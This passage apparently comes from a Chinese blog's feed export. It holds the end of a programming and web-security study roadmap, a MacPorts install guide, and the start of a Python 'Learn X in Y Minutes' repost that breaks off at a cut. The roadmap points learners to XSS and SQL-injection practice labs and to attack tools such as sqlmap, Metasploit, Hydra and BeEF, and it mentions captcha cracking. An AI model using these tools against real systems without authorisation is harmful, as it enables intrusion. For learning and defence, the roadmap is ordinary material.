rel="noopener">正则表达式操作指南</a> </li><li><code>《精通正则表达式》</code></li></ul></li><li>第18章 多线程编程</li><li>20.2 使用Python进行Web应用：创建一个简单的Web客户端</li></ul></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul><li><code>鸟哥的Linux私房菜</code></li><li><code>《Unix环境高级编程》</code></li><li><code>《UNIX系统编程》</code> </li><li>学会使用man来查看帮助</li><li>文件系统结构和基本操作 ls/chmod/chown/rm/find/ln/cat/mount/mkdir/tar/gzip …</li><li>学会使用一些文本操作命令 sed/awk/grep/tail/less/more …</li><li>学会使用一些管理命令 ps/top/lsof/netstat/kill/iptables/dd…</li><li>了解/etc目录下的各种配置文章,学会查看/var/log下的系统日志,以及/proc下的系统运行信息</li><li>了解正则表达式,使用正则表达式来查找文件。</li></ul><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><ul><li>学习HTML基本语法</li><li>学习CSS如何选中HTML元素并应用一些基本样式(关键词:box model) </li><li>配置Apache </li><li>学习使用Javascript操纵HTML元件。</li><li>学习PHP,让后台PHP和前台HTML进行数据交互,对服务器相应浏览器请求形成初步认 识。实现一个表单提交和反显的功能。</li><li>把PHP连接本地或者远程数据库 MySQL(MySQL 和 SQL现学现用够了) </li><li>跟完一个名校的<a href="http://www.stanford.edu/~ouster/cgi-bin/cs142- fall10/index.php" target="_blank" rel="noopener">网络编程课程</a> 不要觉得需要多于一学期时间,大学生是全职一学期选3-5门课,你业余时 间一定可以跟上</li><li>学习一个javascript库(例如jQuery 或 ExtJS)+ Ajax (异步读入一个服务器端图片或者数据库 内容)+JSON数据格式。</li><li><code>《HTTP: The Definitive Guide》</code> 读完前4章你就明白你每天上网用浏览器的时候发生的事情了 (proxy, gateway, browsers)</li><li>跳转<ul><li>302 <code>&lt;?php header(&quot;Location: 3.php&quot;); ?&gt;</code></li><li>301 <code>&lt;?php header(&quot;HTTP/1.1 301 Moved Permanently&quot;); header(&quot;Location: 2.php&quot;); ?&gt;</code></li><li>u=urllib2.urlopen(url)后，u.url能得到服务端跳转后的地址 urllib2自己的特性 所谓的会跟进去</li><li>浏览器跳转<ul><li><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://www.evilcos.me&quot; /&gt;</code> htmlparse解析就行了</li><li><code>location.href=&quot;http:/&quot; + &quot;/evilcos.me&quot;;</code> 正则解析（弱） JavaScript引擎解析（强）</li></ul></li></ul></li></ul><h2 id="熟练-VIM"><a href="#熟练-VIM" class="headerlink" title="熟练 VIM"></a>熟练 VIM</h2><ul><li><a href="http://coolshell.cn/articles/5426.html" target="_blank" rel="noopener">实战至少3回合：http://coolshell.cn/articles/5426.html User Link</a></li><li>配置代码补全</li><li>外观</li><li>外部命令</li><li>Source Insight(ctag)</li></ul><h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul><li><a href="http://git-scm.com/book/zh" target="_blank" rel="noopener">Pro Git</a></li><li><a href="http://www.worldhello.net/gotgithub/index.html" target="_blank" rel="noopener">GotGitHub</a></li><li><a href="http://try.github.com/levels/1/challenges/1" target="_blank" rel="noopener">tryGit</a></li><li><a href="http://gitimmersion.com/lab_01.html" target="_blank" rel="noopener">GitImmersion</a></li><li><a href="http://marklodato.github.com/visual-git-guide/index-zh-cn.html" target="_blank" rel="noopener">visual-git-guide</a></li><li><a href="http://nvie.com/posts/a-successful-git-branching-model/" target="_blank" rel="noopener">a-successful-git-branching-model</a></li><li><a href="http://www.kernel.org/pub/software/scm/git/docs/everyday.html" target="_blank" rel="noopener">Everyday GIT With 20 Commands Or So</a></li></ul><hr><h1 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h1><h2 id="翻墙"><a href="#翻墙" class="headerlink" title="翻墙"></a>翻墙</h2><ul><li>shadowsocks + 一台海外 VPS + Chrome(SwitchyOmega)/Firefox(AutoProxy) <a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=210457700&amp;idx=1&amp;sn=322d1e4c13d3f33ade848e3889c410bf#rd" target="_blank" rel="noopener">我是如何优雅且靠谱地翻墙</a></li><li>SSH 隧道</li></ul><h2 id="前端进阶"><a href="#前端进阶" class="headerlink" title="前端进阶"></a>前端进阶</h2><ul><li><p>DOM</p><ul><li>理解DOM和<a href="http://oreilly.com/catalog/9780596527402" target="_blank" rel="noopener">动态网页</a>  </li><li><a href="http://www.w3school.com.cn/htmldom/index.asp" target="_blank" rel="noopener">DOM</a> </li><li><code>《JavaScript DOM编程艺术》</code>。</li></ul></li><li><p>库</p><ul><li>jQuery<ul><li>优秀的插件应该体验一遍，并做些尝试</li><li>官方文档得过一遍</li></ul></li><li>D3.js</li><li>ECharts<ul><li>来自百度</li></ul></li><li>Google API</li><li>ZoomEye Map组件<ul><li>ZoomEye团队自己基于开源的打造</li></ul></li><li>AngularJS<ul><li>Google出品的颠覆性前端框架</li></ul></li><li>Bootstrap<ul><li>应该使用一遍<h2 id="c"><a href="#c" class="headerlink" title="c"></a>c</h2></li></ul></li></ul></li><li>重新学C语言,理解指针和内存模型,用C语言实现一下各种经典的算法和数据结构。推荐 <code>《计算机程序设计艺术》</code>、<code>《算法导论》</code>和<code>《编程珠玑》</code>。 </li><li>学习(麻省理工免费课程)计算机科学和编程导论 </li><li>学习(麻省理工免费课程)C语言内存管理 </li><li>学习Windows SDK编程(<code>《Windows 程序设计》</code> ,<code>《MFC程序设计》</code>) <ul><li>写一个窗口,了解WinMain/WinProcedure,以及Windows的消息机制。 </li><li>写一些程序来操作Windows SDK中的资源文件或是各种图形控件,以及作图的编程。 </li><li>学习如何使用MSDN查看相关的SDK函数,各种WM_消息以及一些例程。 </li><li>这本书中有很多例程,在实践中请不要照抄,试着自己写一个自己的例程。 </li><li>不用太多于精通这些东西,因为GUI正在被Web取代,主要是了解一下Windows 图形 界面的编程。</li></ul></li></ul><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul><li>Java 的学习主要是看经典的Core Java <code>《Java 核心技术编程》</code>和<code>《Java编程思想》</code>(有两卷, 我仅链了第一卷,足够了,因为Java的图形界面了解就可以了)</li><li>学习JDK,学会查阅<a href="http://download.oracle.com/javase/6/docs/api/" target="_blank" rel="noopener">Java API Doc</a>  </li><li>了解一下Java这种虚拟机语言和C和Python语言在编译和执行上的差别。从C、Java、Python 思考一下“跨平台”这种技术。</li><li>学会使用IDE Eclipse,使用Eclipse 编译,调试和开发Java程序。 </li><li>建一个Tomcat的网站,尝试一下JSP/Servlet/JDBC/MySQL的Web开发。把前面所说的那个 PHP的小项目试着用JSP和Servlet实现一下。</li></ul><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><ul><li>你可以安装MSSQLServer或MySQL来学习数据库。 </li><li>学习教科书里数据库设计的那几个范式,1NF,2NF,3NF,…… </li><li>学习数据库的存过,触发器,视图,建索引,游标等。 </li><li>学习SQL语句,明白表连接的各种概念(参看<code>《SQL Join的图示》</code>) </li><li>学习如何优化数据库查询(参看<code>《MySQL的优化》</code>) </li><li>实践任务:<ul><li>设计一个论坛的数据库,至少满足3NF,使用SQL语句查询本周,本月的最新文 章,评论最多的文章,最活跃用户。</li></ul></li></ul><h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><ul><li>学会使用SVN或Git来管理程序版本。</li><li>学会使用JUnit来对Java进行单元测试。</li><li>学习C语言和Java语言的coding standard 或 coding guideline。(我N年前写过一篇关C语言非 常简单的文章——<code>《编程修养》</code>,这样的东西你可以上网查一下,一大堆)。 </li><li>推荐阅读<code>《代码大全》`</code>《重构》<code></code>《代码整洁之道》`</li></ul><h2 id="web-安全"><a href="#web-安全" class="headerlink" title="web 安全"></a>web 安全</h2><ul><li>学习Web开发的安全问题(参考<a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="noopener">新浪微博被攻击的这个事</a>,以及<a href="http://guides.rubyonrails.org/security.html" target="_blank" rel="noopener">Ruby的这篇文章</a>)</li><li><a href="http://www.zhihu.com/question/21606800/answer/22268855" target="_blank" rel="noopener">零基础如何学习Web安全</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/res/web_component.png" target="_blank" rel="noopener">8+1：一图胜千言哎:) </a></li><li><a href="http://zoomeye.org" target="_blank" rel="noopener">钟馗之眼</a> <a href="http://www.zoomeye.org/search/dork" target="_blank" rel="noopener">大量样例</a><h3 id="Web安全标准"><a href="#Web安全标准" class="headerlink" title="Web安全标准"></a>Web安全标准</h3><ul><li>OWASP</li><li>WASC<h3 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h3></li><li>XSS <ul><li>内部平台：ks-xsslab_open CSRF ClickJacking</li><li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a>   答案：xss_quiz.txt </li><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a>  答案：<a href="https://github.com/cure53" target="_blank" rel="noopener">https://github.com/cure53</a> XSSChallengeWiki/wiki/prompt.ml </li><li><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a>  答案：<a href="http://blog.nsfocus.net/alert1-to-win-write-up/" target="_blank" rel="noopener">http://blog.nsfocus.net/alert1-to-win-write-up/</a> </li></ul></li><li>SQL<ul><li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> </li></ul></li><li><a href="http://www.ichunqiu.com" target="_blank" rel="noopener">http://www.ichunqiu.com</a></li><li><a href="http://sebug.net" target="_blank" rel="noopener">http://sebug.net</a></li><li><a href="http://zoomeye.org" target="_blank" rel="noopener">http://zoomeye.org</a></li><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a><h3 id="Firefox-插件"><a href="#Firefox-插件" class="headerlink" title="Firefox 插件"></a>Firefox 插件</h3></li><li>Firebug</li><li>Tamper Data</li><li>Live Http Header</li><li>Hackbar</li><li>Modify Header</li><li>GreaseMonkey <a href="http://userscripts.org/scripts/show/119798" target="_blank" rel="noopener">http://userscripts.org/scripts/show/119798</a></li><li>NoScript</li><li>AutoProxy<h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3></li><li>F12</li><li>SwichySharp</li><li>CookieHacker<h3 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h3></li><li>watcher</li><li>浏览器代理</li><li>拦截请求或相应</li><li>抓包</li><li>重放</li><li>模拟请求</li><li>编码解码<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3></li><li>Wireshark</li><li>Tcpdump<h3 id="Web2-0-Hacking"><a href="#Web2-0-Hacking" class="headerlink" title="Web2.0 Hacking"></a>Web2.0 Hacking</h3></li><li>XSS’OR<ul><li>常用其中加解密与代码生成</li><li><a href="http://evilcos.me/lab/xssor/" target="_blank" rel="noopener">http://evilcos.me/lab/xssor/</a> User Link</li><li>源码：<a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a> User Link</li></ul></li><li>XSSEE 3.0 Beta<ul><li>Monyer开发的，加解密最好用神器</li><li><a href="http://evilcos.me/lab/xssee/" target="_blank" rel="noopener">http://evilcos.me/lab/xssee/</a> User Link</li></ul></li><li>Online JavaScript beautifier<ul><li>JavaScript美化工具，分析JavaScript常用</li><li><a href="http://jsbeautifier.org/" target="_blank" rel="noopener">http://jsbeautifier.org/</a> User Link</li></ul></li><li>BeEF<ul><li>The Browser Exploitation Framework</li><li><a href="http://beefproject.com/" target="_blank" rel="noopener">http://beefproject.com/</a> User Link<h3 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h3></li></ul></li><li>Fiddler 非常经典好用的Web调试代理工具</li><li>Burp Suite 神器，不仅HTTP代理，还有爬虫、漏洞扫描、渗透、爆破等功能</li><li>mitmproxy Python写的，基于这个框架写神器实在太方便了<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3></li><li>AWVS 不仅漏扫方便，自带的一些小工具也好用</li><li>Nmap 绝对不仅仅是端口扫描！几百个脚本</li><li>Python自写脚本/工具<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3></li><li>sqlmap SQL注入利用最牛神器，没有之一</li><li>Metasploit 最经典的渗透框架</li><li>Hydra 爆破必备</li></ul></li></ul><h2 id="Unix-Linux"><a href="#Unix-Linux" class="headerlink" title="Unix/Linux"></a>Unix/Linux</h2><ul><li><code>《Unix编程艺术》`</code>《Linux Shell脚本攻略》<code></code>《Software Design 中文版》`<ul><li>用这些系统知识操作一下文件系统,用户(实现一个可以拷贝目录树的小程序) </li><li>用fork/wait/waitpid写一个多进程的程序,用pthread写一个多线程带同步或互斥的程 序。多进程多进程购票的程序。 </li><li>用signal/kill/raise/alarm/pause/sigprocmask实现一个多进程间的信号量通信的程序。 </li><li>学会使用gcc和gdb来编程和调试程序。</li><li>学会使用makefile来编译程序。</li><li>IPC和Socket的东西可以放到高级中来实践。<h2 id="爬虫进阶"><a href="#爬虫进阶" class="headerlink" title="爬虫进阶"></a>爬虫进阶</h2></li><li>代理池<ul><li>爬虫「稳定」需要</li></ul></li><li>网络请求<ul><li>wget/curl</li><li>urllib2/httplib2/requests</li><li>idea scrapy</li></ul></li><li>验证码破解<ul><li>pytesser<h2 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h2></li></ul></li><li>crontab是最原生的定时调度</li><li>基于redis实现的分布式调度</li><li>基于rpyc实现的分布式调度</li><li>celery/gearman等调度框架<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2></li><li>线程池<ul><li>进程内优美的并发方案</li></ul></li><li>协程<ul><li>进程内另一种优美的并发方案</li><li>gevent</li></ul></li><li>多进程<ul><li>os.fork</li><li>multiprocessing<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2></li></ul></li><li>JSON</li><li>cPickle</li><li>protobuf<h2 id="数据存储及处理"><a href="#数据存储及处理" class="headerlink" title="数据存储及处理"></a>数据存储及处理</h2></li><li>数据库<ul><li>MySQL</li><li>MongoDB</li><li>Cassandra</li><li>Hadoop体系</li><li>Redis</li><li>Sqlite</li><li>bsddb</li><li>ElasticSearch</li></ul></li><li>大数据处理<ul><li>Hive</li><li>Spark</li></ul></li><li>ELK<ul><li>ElasticSearch</li><li>Logstash</li><li>Kibana<h2 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h2></li></ul></li><li>SSH证书</li><li>Fabric</li><li>SaltStack</li><li>puppet</li><li>pssh/dsh</li><li>运维进阶<ul><li>运维工程师必须掌握的基础技能有哪些？</li><li><a href="http://www.zhihu.com/question/23665108/answer/25299881" target="_blank" rel="noopener">http://www.zhihu.com/question/23665108/answer/25299881</a> User Link<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2></li></ul></li><li>pdb</li><li>logging</li><li>Sentry</li><li>strace/ltrace</li><li>lsof</li><li>性能<ul><li>Python内<ul><li>timeit</li><li><a href="https://docs.python.org/2/library/unittest.html" target="_blank" rel="noopener">unittest</a></li><li>cProfile</li><li>Python性能分析指南：<a href="http://www.oschina.net/translate/python-performance-analysis" target="_blank" rel="noopener">http://www.oschina.net/translate/python-performance-analysis</a> User Link</li></ul></li><li>Python外<ul><li>top/htop/free/iostat/vmstat/ifconfig/iftop…<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2></li></ul></li></ul></li><li>分词</li><li>贝叶斯</li><li>神经元<br>遗传算法</li><li>聚类/分类</li></ul></li></ul><h2 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h2><ul><li>自测试</li><li>nose</li><li>Jenkins</li></ul><hr><h1 id="书"><a href="#书" class="headerlink" title="书"></a>书</h1><p><code>黑客与画家</code> <code>浪潮之巅</code> <code>重构</code> <code>代码整洁之道</code> <code>Rework中文版</code> <code>高效程序员的45个习惯</code> <code>黑客攻防技术宝典（Web实战篇）</code> <code>白帽子讲Web安全</code> <code>Web前端黑客技术揭秘</code> <code>Web之困</code> <code>SQL注入攻击与防御</code> <code>自私的基因</code> <code>失控</code></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>pip</li><li>Vagrant</li><li>tmux/screen</li><li>vim</li><li>Markdown</li><li>zsh + oh-my-zsh</li><li>Python2.7</li><li>Django1.4<ul><li><a href="http://djangobook.py3k.cn/2.0/" target="_blank" rel="noopener">http://djangobook.py3k.cn/2.0/ </a></li><li><a href="http://django-debug-toolbar.readthedocs.org/en/latest/" target="_blank" rel="noopener">Django Debug Toolbar </a></li><li>web.py</li><li>Flask</li><li>Tornado</li></ul></li><li>node.js</li><li>Ubuntu/Gentoo/Centos</li><li>ipython</li></ul><p>￼￼￼￼￼￼￼￼￼￼￼</p>]]></content>
      
      
      <categories>
          
          <category> Discovery </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安装 MacPorts</title>
      <link href="/2015/10-23-macports/"/>
      <url>/2015/10-23-macports/</url>
      
        <content type="html"><![CDATA[<p>Mac下安装软件一般都是下载<code>dmg</code>、<code>pkg</code>包来安装。<br>在命令行中常使用<code>brew</code>、<code>wget</code>、<code>pip</code>来安装命令行软件包。<br>突然发现<code>MacPorts</code>终于更新了支持<code>el capitan</code>的新版本，不下不是中国人。<br><a id="more"></a></p><hr><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="http://www.macports.org/install.php" target="_blank" rel="noopener">MacPorts 的下载页面</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>双击<code>MacPorts-2.3.4-10.11-ElCapitan.pkg</code> 一直点击继续来安装，需要输入密码。  </p><p>安装之前最好是断网，不然安装过程中要联网检查更新，我这里打开了 <code>lantern</code>和<code>shadowsock</code>都卡了二十分钟。  </p><p>然后在你的<code>bashrc</code>文件（我用的 <code>zsh</code>，也就是<code>~/.zshrc</code>文件）中添加:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=<span class="variable">$PATH</span><span class="symbol">:/opt/local/bin</span></span><br><span class="line">export MANPATH=<span class="variable">$MANPATH</span><span class="symbol">:/opt/local/share/man</span></span><br><span class="line">export INFOPATH=<span class="variable">$INFOPATH</span><span class="symbol">:/opt/local/share/info</span></span><br></pre></td></tr></table></figure></p><p>更新ports tree和MacPorts版本，强烈推荐第一次运行的时候使用-v参数，显示详细的更新过程。<br><code>sudo port -v selfupdate</code>  </p><p>搜索索引中的软件<br><code>port search name</code></p><p>安装新软件<br><code>sudo port install name</code></p><p>卸载软件<br><code>sudo port uninstall name</code></p><p>查看有更新的软件以及版本<br><code>port outdated</code></p><p>升级可以更新的软件<br><code>sudo port upgrade outdated</code></p><p>Eclipse的插件需要subclipse需要JavaHL，下面通过MacPorts来安装<br><code>sudo port install subversion-javahlbindings</code></p>]]></content>
      
      
      <categories>
          
          <category> Geek Talks · 奇客怪谈 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「转」Learn X in Y Minutes - Python</title>
      <link href="/2015/10-22-learnxinyminutes/"/>
      <url>/2015/10-22-learnxinyminutes/</url>
      
        <content type="html"><![CDATA[<p><strong>搬运自<a href="https://github.com/adambard/learnxinyminutes-docs" target="_blank" rel="noopener">learnxinyminutes-docs</a><br>文档地址<a href="https://github.com/adambard/learnxinyminutes-docs/blob/master/python.html.markdown" target="_blank" rel="noopener">python.html.markdown</a></strong><br><a id="more"></a></p><hr><blockquote><p>language: python<br>contributors编撰者:</p><pre><code>- [&quot;Louie Dinh&quot;, &quot;http://ldinh.ca&quot;]- [&quot;Amin Bandali&quot;, &quot;http://aminbandali.com&quot;]- [&quot;Andre Polykanine&quot;, &quot;https://github.com/Oire&quot;]- [&quot;evuez&quot;, &quot;http://github.com/evuez&quot;]</code></pre><p>filename: learnpython.py</p></blockquote><p><em>Python was created by Guido Van Rossum in the early 90s. It is now one of the most popular<br>languages in existence. I fell in love with Python for its syntactic clarity. It’s basically<br>executable pseudocode.</em><br>Python 是90年代初由 Guido Van Rossum 发明的。这是当今最热门的语言之一。我最爱 Python 的简洁语法。它简直就是可执行的伪代码。  </p><p><em>Feedback would be highly appreciated! You can reach me at <a href="http://twitter.com/louiedinh" target="_blank" rel="noopener">@louiedinh</a> or louiedinh [at] [google’s email service]8</em><br>我们期待你的反馈：<a href="http://twitter.com/louiedinh" target="_blank" rel="noopener">@louiedinh</a> 或 <a href="mailto:louiedinh@gmail.com" target="_blank" rel="noopener">louiedinh@gmail.com</a>  </p><p>Note: This article applies to Python 2.7 specifically, but should be applicable<br>to Python 2.x. Python 2.7 is reachong end of life and will stop beeign maintained in 2020,<br>it is though recommended to start learnign Python with Python 3.<br>注意： 这篇文章特别应用于 Python2.7版本，也可用于 Python2.x。Python 2.7将一直支持到2020年，是时候建议你开始学习 Python 3了。  </p><p>For Python 3.x, take a look at the <a href="http://learnxinyminutes.com/docs/python3/" target="_blank" rel="noopener">Python 3 tutorial</a>.<br>对于 Python 3.x 的学习者， 参见<a href="http://learnxinyminutes.com/docs/python3/" target="_blank" rel="noopener">Python 3 tutorial</a>。  </p><p>It is also possible to write Python code which is compatible with Python 2.7 and 3.x at the same time,<br>using Python <a href="https://docs.python.org/2/library/__future__.html" target="_blank" rel="noopener"><code>__future__</code> imports</a>. <code>__future__</code> imports<br>allow you to write Python 3 code that will run on Python 2, so check out the Python 3 tutorial.<br>使用<a href="https://docs.python.org/2/library/__future__.html" target="_blank" rel="noopener"><code>__future__</code> imports</a>来写 Python 代码可以让 Python 2.7 和 3.x 版本和谐共处。<code>__future__</code> imports 可以让你在 Python 2 环境下运行 Python 3的代码，详见 Python 3 教程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span 